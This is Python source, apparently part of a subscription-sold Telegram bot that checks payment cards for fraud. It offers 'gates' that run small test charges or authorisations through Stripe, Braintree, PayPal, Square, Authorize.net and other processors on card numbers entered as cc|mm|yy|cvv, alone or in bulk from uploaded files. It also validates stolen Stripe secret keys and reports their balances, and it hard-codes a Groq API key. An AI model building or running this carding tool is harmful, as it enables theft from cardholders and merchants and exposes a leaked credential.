            [InlineKeyboardButton("Stripe Auth", callback_data='stripe_auth'), InlineKeyboardButton("Braintree Auth", callback_data='braintree_auth')],
            [InlineKeyboardButton(" Monoris Auth", callback_data='monoris_auth'), InlineKeyboardButton("NMI Auth", callback_data='nmi_auth')],
            [InlineKeyboardButton("Paypal Auth", callback_data='paypal_auth'), InlineKeyboardButton("Square Auth", callback_data='square_auth')],
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_gate'), InlineKeyboardButton("❌ Terminate", callback_data='terminate')]
        ]
        auth_reply_markup = InlineKeyboardMarkup(auth_keyboard)
        await query.edit_message_text(text="Welcome to Auth! Choose an option:", reply_markup=auth_reply_markup)
    elif query.data == 'back_to_charge':
        charge_keyboard = [
            [InlineKeyboardButton("⚡ STRIPE 1$ CHARGE", callback_data='stripe_charge'), InlineKeyboardButton("🔒 Authorized.net 5$ CHARGE", callback_data='authorized_charge')],
            [InlineKeyboardButton("🔒 Braintree CHARGE", callback_data='braintree_charge'), InlineKeyboardButton("🔒 Payflow 5 CHARGE", callback_data='payflow_charge')],
            [InlineKeyboardButton("🔒 Ayden 5$ CHARGE", callback_data='ayden_charge')],
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_gate')]
        ]
        charge_reply_markup = InlineKeyboardMarkup(charge_keyboard)
        await query.edit_message_text(text="Welcome to CHARGE! Choose an option:", reply_markup=charge_reply_markup)
    elif query.data == 'terminate':
        await query.delete_message()
        await send_animated_message(update, context)
    elif query.data == 'stop':
        context.user_data['stop'] = True
        await query.edit_message_text(text="Processing stopped.")
    elif query.data == 'rank':
        user_id = query.from_user.id
        result = check_subscription(user_id)
        await query.edit_message_text(result)
    elif query.data == 'gen':
        await gen_command(update, context)
    elif query.data == 'ban':
        await ban_command(update, context)
    elif query.data == 'unban':
        await unban_command(update, context)
    elif query.data == 'subs':
        await subs_command(update, context)
    elif query.data == 'keys':
        await keys_command(update, context)
    elif query.data == 'reset':
        await reset_command(update, context)
    elif query.data == 'broadcast':
        await broadcast_command(update, context)

async def send_animated_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = await update.effective_chat.send_message("E")
    await asyncio.sleep(0.5)
    await message.edit_text("En")
    await asyncio.sleep(0.5)
    await message.edit_text("Enj")
    await asyncio.sleep(0.5)
    await message.edit_text("Enjo")
    await asyncio.sleep(0.5)
    await message.edit_text("Enjoy")
    await asyncio.sleep(0.5)
    await message.edit_text("Enjoy d")
    await asyncio.sleep(0.5)
    await message.edit_text("Enjoy du")
    await asyncio.sleep(0.5)
    await message.edit_text("Enjoy du@")
    await asyncio.sleep(0.5)
    await message.edit_text("Enjoy du@B")
    await asyncio.sleep(0.5)
    await message.edit_text("Enjoy du@Ba")
    await asyncio.sleep(0.5)
    await message.edit_text("Enjoy du@Baign")
    await asyncio.sleep(0.5)
    await message.edit_text("Enjoy du@BaignX")
    await asyncio.sleep(0.5)
    await message.edit_text("Enjoy dude @BaignX")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    username = user.username if user.username else user.first_name
    welcome_message = (
    f" 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗗𝗲𝗮𝗿, @{username}! \n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
"𝗘𝗻𝗷𝗼𝘆 𝗧𝗵𝗲 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗔𝗻𝗱 𝗕𝗲𝗻𝗲𝗳𝗶𝘁𝘀 \n"

"𝗥𝗲𝗴𝗶𝘀𝘁𝗲𝗿 𝗢𝘂𝗿 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗜𝗳 𝗬𝗼𝘂 𝗗𝗼𝗻'𝘁!\n"
)


    if is_registered(user.id):
        keyboard = [
            [InlineKeyboardButton("🚪 Gate", callback_data='gate')],
            [InlineKeyboardButton("❓ Help", callback_data='help')],
            [InlineKeyboardButton("🛠️ Tools", callback_data='tools')],
            [InlineKeyboardButton("🏆 Rank", callback_data='rank')]
        ]

        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(welcome_message, reply_markup=reply_markup)
    else:
        register_keyboard = [
            [InlineKeyboardButton("📝 Register", callback_data='register')]
        ]

        reply_markup = InlineKeyboardMarkup(register_keyboard)

        await update.message.reply_text(welcome_message, reply_markup=reply_markup)

async def subscribe_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    plans_message = "<b>📜 Available Subscription Plans 📜</b>\n"
    plans_message += "━━━━━━━━━━━━━━━━━━━━━━\n"

    for plan, details in plans.items():
        if "price" in details and "duration" in details:
            plans_message += f"<b>✨ {plan} ✨</b>\n"
            plans_message += f"💰 <b>Price:</b> <code>{details['price']}</code>\n"
            plans_message += f"🕒 <b>Duration:</b> <code>{details['duration'].days} days</code>\n"
            plans_message += "━━━━━━━━━━━━━━━━━━━━━━\n"
        else:
            plans_message += f"<b>📩 {plan} 📩</b>\n"
            plans_message += f"{details['note']}\n"
            plans_message += "━━━━━━━━━━━━━━━━━━━━━━\n"

    await update.message.reply_text(plans_message, parse_mode="HTML")

async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.message.from_user.id):
        await update.message.reply_text("🚫 **You are not authorized to use this command.**")
        return

    message = update.message.text
    if message.startswith('/gen '):
        plan = message[len('/gen '):].strip()
        result = generate_key(plan)
        await update.message.reply_text(result)
    else:
        await update.message.reply_text("📋 **Please send the command with the plan name in the format:** /gen [plan]")

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = update.message.text
    if message.startswith('/redeem '):
        key = message[len('/redeem '):].strip()
        result = redeem_key(key, context)
        await update.message.reply_text(result)
    else:
        await update.message.reply_text("📋 **Please send the command with the key in the format:** /redeem [key]")

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    result = check_subscription(user_id)
    await update.message.reply_text(result)

async def freegate_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if not is_admin(user_id) and not is_owner(user_id):
        subscription_status = check_subscription(user_id)
        if "No active subscription" in subscription_status:
            await update.message.reply_text("🚫 **You do not have an active subscription.** 🚫\n\nPlease subscribe using /subscribe.")
            return
        elif "Subscription expired" in subscription_status:
            await update.message.reply_text("🕒 **Your subscription has expired.** 🕒\n\nPlease renew using /subscribe.")
            return

    message = update.message.text
    if message.startswith('/freegate '):
        combo = message[len('/freegate '):].split('|')
        if len(combo) != 4:
            await update.message.reply_text("🚫 **Invalid input format. Use cc|mm|yy|cvv.**")
            return

        processing_message = await update.message.reply_text("🔄 **Processing...** 🔄")
        result = check_stripe_charge(combo)
        await processing_message.edit_text(result)
    else:
        await update.message.reply_text("📋 **Please send the command with credit card details in the format:** /freegate cc|mm|yy|cvv")

async def rank_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    result = check_subscription(user_id)
    await update.message.reply_text(result)

async def adm_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.message.from_user.id) and not is_owner(update.message.from_user.id):
        await update.message.reply_text("🚫 **You are not authorized to use this command.**")
        return

    adm_keyboard = [
        [InlineKeyboardButton("💳 Generate Key", callback_data='gen')],
        [InlineKeyboardButton("🔒 Ban User", callback_data='ban')],
        [InlineKeyboardButton("🔓 Unban User", callback_data='unban')],
        [InlineKeyboardButton("📋 View Subscriptions", callback_data='subs')],
        [InlineKeyboardButton("🔑 View Keys", callback_data='keys')],
        [InlineKeyboardButton("🔄 Reset Subscription", callback_data='reset')],
        [InlineKeyboardButton("📢 Broadcast Message", callback_data='broadcast')]
    ]
    adm_reply_markup = InlineKeyboardMarkup(adm_keyboard)
    await update.message.reply_text(
        """Welcome to the Admin Panel! These are the admin commands:

1. **Generate Key**: `/gen [plan]`
   - Generates a subscription key for the specified plan.

2. **Ban User**: `/ban [user_id]`
   - Bans a user by their user ID.

3. **Unban User**: `/unban [user_id]`
   - Unbans a previously banned user by their user ID.

4. **View Subscriptions**: `/subs`
   - Lists all active subscriptions.

5. **View Keys**: `/keys`
   - Lists all unused subscription keys.

6. **Reset Subscription**: `/reset [user_id]`
   - Resets the subscription for a specified user.

7. **Broadcast Message**: `/broadcast [message]`
   - Sends a message to all users of the bot.
        """,
        reply_markup=adm_reply_markup
    )

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.message.from_user.id):
        await update.message.reply_text("🚫 **You are not authorized to use this command.**")
        return

    message = update.message.text
    if message.startswith('/ban '):
        user_id = message[len('/ban '):].strip()
        with open(f'data/banned_users/{user_id}.txt', 'w') as f:
            f.write("banned")
        await update.message.reply_text(f"User {user_id} has been banned.")
    else:
        await update.message.reply_text("📋 **Please send the command with the user ID in the format:** /ban [user_id]")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.message.from_user.id):
        await update.message.reply_text("🚫 **You are not authorized to use this command.**")
        return

    message = update.message.text
    if message.startswith('/unban '):
        user_id = message[len('/unban '):].strip()
        if os.path.exists(f'data/banned_users/{user_id}.txt'):
            os.remove(f'data/banned_users/{user_id}.txt')
            await update.message.reply_text(f"User {user_id} has been unbanned.")
        else:
            await update.message.reply_text(f"User {user_id} is not banned.")
    else:
        await update.message.reply_text("📋 **Please send the command with the user ID in the format:** /unban [user_id]")

async def subs_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.message.from_user.id):
        await update.message.reply_text("🚫 **You are not authorized to use this command.**")
        return

    subscriptions = [f for f in os.listdir('data/subscriptions') if f.endswith('.txt')]

    if not subscriptions:
        await update.message.reply_text("📋 **No active subscriptions.**")
        return

    subscriptions_message = "Active Subscriptions:\n\n"
    for subscription in subscriptions:
        user_id = subscription.split('.')[0]
        with open(f'data/subscriptions/{user_id}.txt', 'r') as f:
            plan, expiry_date = f.read().strip().split('|')
            subscriptions_message += f"User ID: {user_id}, Plan: {plan}, Expiry: {expiry_date}\n"

    await update.message.reply_text(subscriptions_message)

async def keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.message.from_user.id):
        await update.message.reply_text("🚫 **You are not authorized to use this command.**")
        return

    keys = [f for f in os.listdir('data/keys') if f.endswith('.txt')]

    if not keys:
        await update.message.reply_text("📋 **No unused keys.**")
        return

    keys_message = "Unused Keys:\n\n"
    for key in keys:
        key_id = key.split('.')[0]
        with open(f'data/keys/{key_id}.txt', 'r') as f:
            key_data = f.read().strip().split('|')
            if key_data[3] == 'unused':
                plan = key_data[1]
                expiry_date = key_data[2]
                keys_message += f"Key: {key_id}, Plan: {plan}, Expiry: {expiry_date}\n"

    await update.message.reply_text(keys_message)

async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.message.from_user.id):
        await update.message.reply_text("🚫 **You are not authorized to use this command.**")
        return

    message = update.message.text
    if message.startswith('/reset '):
        user_id = message[len('/reset '):].strip()
        if os.path.exists(f'data/subscriptions/{user_id}.txt'):
            os.remove(f'data/subscriptions/{user_id}.txt')
            await update.message.reply_text(f"Subscription for user {user_id} has been reset.")
        else:
            await update.message.reply_text(f"User {user_id} has no active subscription.")
    else:
        await update.message.reply_text("📋 **Please send the command with the user ID in the format:** /reset [user_id]")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.message.from_user.id):
        await update.message.reply_text("🚫 **You are not authorized to use this command.**")
        return

    message = update.message.text
    if message.startswith('/broadcast '):
        broadcast_message = message[len('/broadcast '):].strip()
        subscriptions = [f for f in os.listdir('data/subscriptions') if f.endswith('.txt')]

        for subscription in subscriptions:
            user_id = subscription.split('.')[0]
            try:
                await context.bot.send_message(chat_id=user_id, text=broadcast_message)
            except Exception as e:
                print(f"Failed to send message to user {user_id}: {e}")

        await update.message.reply_text(f"Broadcast message sent to {len(subscriptions)} users.")
    else:
        await update.message.reply_text("📋 **Please send the command with the message in the format:** /broadcast [message]")

client = Groq(api_key="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")

async def ai_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = update.message.text

    if message.startswith('/ai '):
        user_message = message[len('/ai '):].strip()

        if not user_message:
            await update.message.reply_text("📋 Please use the correct format: /ai {message}")
            return

        try:
            response = client.chat.completions.create(
                model="deepseek-r1-distill-qwen-32b",
                messages=[{"role": "user", "content": user_message}],
                temperature=0.6,
                top_p=0.95,
                stream=False
            )

            generated_text = response.choices[0].message.content if response.choices else "⚠️ No response received from AI."

        except Exception as e:
            generated_text = f"❌ Error: {str(e)}"

        await update.message.reply_text(generated_text)

async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = update.message.text
    if message.startswith('/bin '):
        bin_number = message[len('/bin '):].strip()
        if len(bin_number) != 6:
            await update.message.reply_text("🚫 **Invalid BIN number. Please provide a 6-digit BIN.**")
            return

        bin_info = get_bin_info(bin_number)
        await update.message.reply_text(f"𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: {bin_info['Scheme']}\n𝐁𝐢𝐧 𝐈𝐧𝐟𝐮𝐫𝐞: {bin_info['Brand']}\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info['Country']}")
    else:
        await update.message.reply_text("📋 **Please send the command with the BIN number in the format:** /bin [6 digit bin]")

async def sk_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = update.message.text
    
    if message.startswith('/sk '):
        sk_key = message[len('/sk '):].strip()
        
        def check_stripe_key(api_key):
            url_live = "https://api.stripe.com/v1/balance"
            url_test = "https://api.stripe.com/v1/customers"
            url_account = "https://api.stripe.com/v1/account"
            headers = {"Authorization": f"Bearer {api_key}"}
            
            is_live = api_key.startswith("sk_live_")
            url = url_live if is_live else url_test
            
            response_text = "🔍 *STRIPE KEY CHECKER* ⚠️\n\n"
            response_text += f"`{api_key}`\n\n"  # Monospace format for easy copying
            
            try:
                # Check key validity
                response = requests.get(url, headers=headers, timeout=10)
                
                if response.status_code == 200:
                    status = "✅ *VALID LIVE*" if is_live else "🟢 *VALID TEST*"
                    response_text += f"*STATUS* - {status}\n━━━━━━━━━━━━━━━━━\n"
                    
                    # Get account details
                    account_response = requests.get(url_account, headers=headers, timeout=10)
                    if account_response.status_code == 200:
                        account_data = account_response.json()
                        response_text += f"*COUNTRY*: `{account_data.get('country', 'Unknown')}`\n"
                    
                    # Get balance for live keys
                    if is_live:
                        balance_data = response.json()
                        available = sum(b['amount']/100 for b in balance_data.get('available', []))
                        pending = sum(b['amount']/100 for b in balance_data.get('pending', []))
                        currency = (balance_data.get('available', [{}])[0].get('currency', 'usd')).upper()
                        
                        response_text += f"*AMOUNT*: `{available:,.2f}`\n"
                        response_text += f"*PENDING*: `{pending:,.2f}`\n"
                        response_text += f"*CURRENCY*: `{currency}`\n"
                        
                elif response.status_code == 401:
                    response_text += "*STATUS* - ❌ *INVALID*\n━━━━━━━━━━━━━━━━━\n"
                    response_text += "This key is not authorized or has been revoked."
                else:
                    response_text += f"*STATUS* - ⚠️ *ERROR* ({response.status_code})\n━━━━━━━━━━━━━━━━━\n"
                    response_text += f"`{response.text[:200]}`"
                    
            except requests.Timeout:
                response_text += "*STATUS* - ⚠️ *TIMEOUT*\n━━━━━━━━━━━━━━━━━\n"
                response_text += "Server took too long to respond"
            except Exception as e:
                response_text += "*STATUS* - ⚠️ *ERROR*\n━━━━━━━━━━━━━━━━━\n"
                response_text += f"`{str(e)}`"
            
            return response_text
        
        result = check_stripe_key(sk_key)
        await update.message.reply_text(result, parse_mode='Markdown')
        
    else:
        await update.message.reply_text(
            "📋 *Usage:* Send `/sk your_stripe_key`\n"
            "Example: `/sk sk_live_51abc123...`",
            parse_mode='Markdown'
        )

def main() -> None:
    application = ApplicationBuilder().token(bot_token).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("str", str_command))
    application.add_handler(CommandHandler("mstr", mstr_command))
    application.add_handler(CommandHandler("strtxt", strtxt_command))
    application.add_handler(CommandHandler("stra", stra_command))
    application.add_handler(CommandHandler("mstra", mstra_command))
    application.add_handler(CommandHandler("strtxta", strtxta_command))
    application.add_handler(CommandHandler("subscribe", subscribe_command))
    application.add_handler(CommandHandler("gen", gen_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CommandHandler("freegate", freegate_command))
    application.add_handler(CommandHandler("rank", rank_command))
    application.add_handler(CommandHandler("adm", adm_command))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document_auth))
    application.add_handler(CommandHandler("bchk", bchk_command))
    application.add_handler(CommandHandler("bchktxt", bchktxt_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("chktxt", chktxt_command))
    application.add_handler(CommandHandler("an", an_command))
    application.add_handler(CommandHandler("anchk", anchk_command))
    application.add_handler(CommandHandler("anchktxt", anchktxt_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document_bchk))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document_chk))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document_anchk))
    application.add_handler(CommandHandler("ai", ai_command))
    application.add_handler(CommandHandler("bin", bin_command))
    application.add_handler(CommandHandler("sk", sk_command))

    application.run_polling()

if __name__ == '__main__':
    main()
